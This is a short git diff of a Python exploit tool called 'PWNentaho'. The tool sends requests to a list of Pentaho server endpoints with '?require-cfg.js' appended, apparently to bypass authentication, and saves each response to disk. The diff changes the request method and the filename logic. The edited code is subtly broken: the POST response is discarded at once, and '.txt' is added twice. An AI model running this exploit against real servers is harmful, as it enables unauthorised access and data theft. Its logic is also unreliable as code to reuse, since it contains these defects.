@@ -20,7 +20,10 @@ class PWNentaho:
             endpoints = self._read_endpoints()
             for endpoint in tqdm(endpoints):
                 try:
-                    response = requests.post(f"{target}/{endpoint}?require-cfg.js", timeout=5)
+                    if "?" in endpoint:
+                        response = requests.post(f"{target}/{endpoint}", timeout=5)
+
+                    response = requests.get(f"{target}/{endpoint}?require-cfg.js", timeout=5)
                     response.raise_for_status()
                     filename = self._extract_filename(endpoint) + ".txt"
                     with open(f"outputs/{filename}", "w") as f:
@@ -48,7 +51,10 @@ class PWNentaho:
         return endpoints
 
     def _extract_filename(self, endpoint):
-        return endpoint.rsplit("/", 1)[-1]
+        if "?" in endpoint:
+            return endpoint.split("/")[-1].split("?")[0] + ".txt"
+        else:
+            return endpoint.rsplit("/", 1)[-1]
 
 
 if __name__ == "__main__":
